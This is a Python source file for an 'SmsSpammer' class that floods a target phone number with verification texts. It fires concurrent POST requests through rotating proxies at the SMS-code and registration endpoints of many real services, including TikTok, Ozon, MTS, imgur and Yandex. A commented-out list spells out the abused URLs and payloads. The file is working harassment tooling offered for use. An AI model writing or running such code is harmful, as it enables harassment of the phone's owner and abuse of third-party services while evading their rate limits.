import asyncio
import aiohttp
import random
import json
import requests
import time


class SmsSpammer:


    def __init__(self, phone ):
        self.phoneNumber = self.make7phone(phone)
        self.proxies=None
        self.timeout=10
        self.timeoutCounter = 0

    def make7phone(self, phone):
            if phone[0] == '+':
                    phone = phone[1:]
            elif phone[0] == '8':
                    phone = '7'+phone[1:]
            elif phone[0] == '9':
                    phone = '7'+phone
            return phone

    async def sendSms(self, websiteData):
        print("started")
        try:
            if websiteData["kind"] == "data":
                requests.post(websiteData["url"], data=websiteData["data"], proxies=self.proxies, timeout=self.timeout)
            elif websiteData["kind"] == "json":
                requests.post(websiteData["url"], json=websiteData["data"], proxies=self.proxies, timeout=self.timeout)
            elif websiteData["kind"] == "params":
                requests.post(websiteData["url"], params=websiteData["data"], proxies=self.proxies, timeout=self.timeout)
            print("yes")
        except:
            print("no")
            self.timeoutCounter = self.timeoutCounter + 1

    def setProxies(self, new_proxies):
        if self.proxies != new_proxies:
            self.timeoutCounter = 0
            self.proxies = new_proxies

    def addparams(self):
        self.name = ''
        for x in range(12):
            self.name = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            self.password = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            self.email = "{}@gmail.com".format(self.name)
        f = open("servicesList.json","r")
        services = f.read()
        services = services.replace("$phone$",self.phoneNumber)
        services = services.replace("$name$",self.name)
        services = services.replace("$email$",self.email)
        services = services.replace("$password$",self.password)
        self.servicesURLs = json.loads(services)
        print(self.servicesURLs)
        exit()
        # self.servicesURLs = [
      # {"url": "https://ng-api.webbankir.com/user/v2/create",
      # "kind": "json",
      # "data": {"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":self.phoneNumber,"email":self.email,"smsCode":""}},
      # {"url": "https://m.tiktok.com/node-a/send/download_link",
      # "kind": "json",
      # "data": {"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":self.phoneNumber[1:],"page":{"pageName":"home","launchMode":"direct","trafficType":""}}},
      # {"url": "https://msk.tele2.ru/api/validation/number/",
      # "kind": "json",
      # "data": {"sender": "Tele2"}},
      # {"url": "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
      # "kind": "json",
      # "data": {"phone": self.phoneNumber, "otpId": 0}},
      # {"url": "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
      # "kind": "data",
      # "data": {"st.r.phone": "+"+self.phoneNumber}},
      # {"url": "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
      # "kind": "params",
      # "data": {"msisdn": self.phoneNumber}},
      # {"url": "https://moneyman.ru/registration_api/actions/send-confirmation-code",
      # "kind": "params",
      # "data": {"+"+self.phoneNumber}},
      # {"url": "https://my.modulbank.ru/api/v2/registration/nameAndPhone",
      # "kind": "json",
      # "data": {"FirstName": self.name, "CellPhone": self.phoneNumber, "Package": "optimal"}},
      # {"url": "https://lenta.com/api/v1/authentication/requestValidationCode",
      # "kind": "json",
      # "data": {"phone": "+"+self.phoneNumber}},
      # {"url": "https://api.imgur.com/account/v1/phones/verify",
      # "kind": "json",
      # "data": {"phone_number": self.phoneNumber, "region_code": "RU"}},
      # {"url": "https://www.icq.com/smsreg/requestPhoneValidation.php",
      # "kind": "data",
      # "data": {"msisdn": self.phoneNumber,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}},
      # {"url": "https://api.eldorado.ua/v1/sign/",
      # "kind": "params",
      # "data": {"login": self.phoneNumber,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"}},
      # {"url": "https://www.citilink.ru/registration/confirm/phone/"+self.phoneNumber+"/",
      # "kind": "data",
      # "data": ""},
      # {"url": "https://youla.ru/web-api/auth/request_code",
      # "kind": "data",
      # "data": {"phone": self.phoneNumber} },
      # {"url": "https://eda.yandex/api/v1/user/request_authentication_code",
      # "kind": "json",
      # "data": {"phone_number": "+"+self.phoneNumber} }
      # ]
        
    async def asyncSendSMS(self,session, websiteData,proxy, i):
        # print("started: "+str(i)+" ,proxy:"+proxy)
        try:
            if websiteData["kind"] == "data":
                await session.post(websiteData["url"], data=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout)
            elif websiteData["kind"] == "json":
                await session.post(websiteData["url"], json=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout)
            elif websiteData["kind"] == "params":
                await session.post(websiteData["url"], params=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout)
        except Exception as e:
            print(e)
            self.timeoutCounter = self.timeoutCounter + 1


    async def asyncSending(self):
        tasks = []
        async with aiohttp.ClientSession() as session:
            i=0
            for service in self.servicesURLs :
                proxy = random.choice(self.proxies)
                tasks.append(self.asyncSendSMS(session, service,proxy,i))
                i+=1
            htmls = await asyncio.gather(*tasks)
            for html in htmls:
                print(html)


    def startSending(self):
            self.addparams()
            # for service in self.servicesURLs:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(self.asyncSending())
                # task = asyncio.create_task(self.sendSms(service))
                # tasks.append(task)
                # asyncio.run(self.sendSms(service))
            exit()
